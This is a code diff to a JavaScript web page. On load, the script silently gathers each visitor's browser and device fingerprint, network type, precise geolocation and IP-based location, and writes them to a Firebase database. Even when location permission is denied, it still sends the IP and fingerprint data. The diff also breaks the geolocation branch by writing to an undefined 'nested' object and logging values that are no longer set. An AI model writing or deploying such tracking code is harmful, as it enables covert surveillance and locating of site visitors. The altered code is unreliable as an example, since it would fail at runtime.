@@ -64,9 +64,8 @@
 
     // Function to write data to Firebase Realtime Database
     function writeDataToFirebase(data) {
-        // Create a valid timestamp for the path
-        const timestamp = new Date().toISOString().replace(/[:.]/g, '-'); // Replace colons and periods with dashes
-        const sanitizedTimestamp = timestamp.replace(/[^a-zA-Z0-9_-]/g, ''); // Remove any remaining invalid characters
+        const timestamp = new Date().toISOString().replace(/[:.]/g, '-'); // Create a valid timestamp for the path
+        const sanitizedTimestamp = timestamp.replace(/[^a-zA-Z0-9_-]/g, ''); // Remove invalid characters
 
         set(ref(database, 'users/' + sanitizedTimestamp), data)
             .then(() => {
@@ -81,20 +80,20 @@
         // Collect browser and device information
         const browserDetails = `Browser: ${navigator.userAgent}`;
         const operatingSystem = `Operating System: ${navigator.platform}`;
-        const osVersion = navigator.userAgent.match(/(Windows NT|Mac OS X|Linux|Android \d+|iPhone OS \d+|iPad OS \d+)/) ? 
-            navigator.userAgent.match(/(Windows NT|Mac OS X|Linux|Android \d+|iPhone OS \d+|iPad OS \d+)/)[0] : 'Unknown OS Version';
+        const osVersionMatch = navigator.userAgent.match(/(Windows NT|Mac OS X|Linux|Android \d+|iPhone OS \d+|iPad OS \d+)/);
+        const osVersion = osVersionMatch ? osVersionMatch[0] : 'Unknown OS Version';
         const screenResolution = `Screen Resolution: ${screen.width} x ${screen.height}`;
         const colorDepth = `Color Depth: ${screen.colorDepth}-bit`;
         const deviceMemory = navigator.deviceMemory ? `Device Memory: ${navigator.deviceMemory} GB` : 'Device Memory: Not Available';
         const logicalProcessors = `Logical Processors: ${navigator.hardwareConcurrency}`;
-        const deviceModel = navigator.userAgent.includes("Mobile") ? "Mobile" : "Desktop"; // Basic check for device model
+        const deviceModel = /Mobi/i.test(navigator.userAgent) ? "Mobile" : "Desktop"; // Improved check for device model
 
         // Collect network details if available
         const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         const networkType = connection ? `Network Type: ${connection.effectiveType}` : 'Network Type: Not Available';
         const downlinkSpeed = connection ? `Downlink Speed: ${connection.downlink} Mbps` : 'Downlink Speed: Not Available';
-	
-	    const collectedData = {
+
+        const collectedData = {
             browserDetails,
             operatingSystem,
             osVersion,
@@ -111,27 +110,40 @@
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
-                    collectedData.latitude = position.coords.latitude;
-                    collectedData.longitude = position.coords.longitude;
+                    collectedData.nested.latitude = position.coords.latitude; // Append latitude
+                    collectedData.nested.longitude = position.coords.longitude; // Append longitude
+
+                    console.log("Geolocation obtained: ", collectedData.latitude, collectedData.longitude); // Debugging
 
                     // Create Google Maps link
                     collectedData.mapsLink = `https://www.google.com/maps?q=${collectedData.latitude},${collectedData.longitude}`;
 
                     // Get IP address and location
                     await getIPInfo(collectedData);
+
+                    // Log the complete collected data before sending
+                    console.log("Collected Data: ", collectedData); // Log entire collected data
                     
                     writeDataToFirebase(collectedData); // Send data to Firebase
                 },
                 async () => {
-                    // If user denies location, get IP info and send the rest of the data
+                    // If user denies location, still get IP info and send the rest of the data
                     await getIPInfo(collectedData);
-                    writeDataToFirebase(collectedData);
+
+                    // Log the complete collected data before sending
+                    console.log("Collected Data (no location): ", collectedData); // Log entire collected data
+                    
+                    writeDataToFirebase(collectedData); // Send data to Firebase
                 }
             );
         } else {
             // If geolocation is not supported
             await getIPInfo(collectedData);
-            writeDataToFirebase(collectedData);
+
+            // Log the complete collected data before sending
+            console.log("Collected Data (no geolocation support): ", collectedData); // Log entire collected data
+            
+            writeDataToFirebase(collectedData); // Send data to Firebase
         }
     }
 
@@ -140,7 +152,9 @@
         const ipData = await ipResponse.json();
         
         data.ipAddress = ipData.ip;
-        data.ipLocation = ipData.city + ', ' + ipData.region + ', ' + ipData.country; // Format IP location
+        data.ipLocation = `${ipData.city}, ${ipData.region}, ${ipData.country}`; // Format IP location properly
+
+        console.log("IP Info obtained: ", data.ipAddress, data.ipLocation); // Debugging
     }
 
     window.onload = collectData; // Run the data collection when the page loads
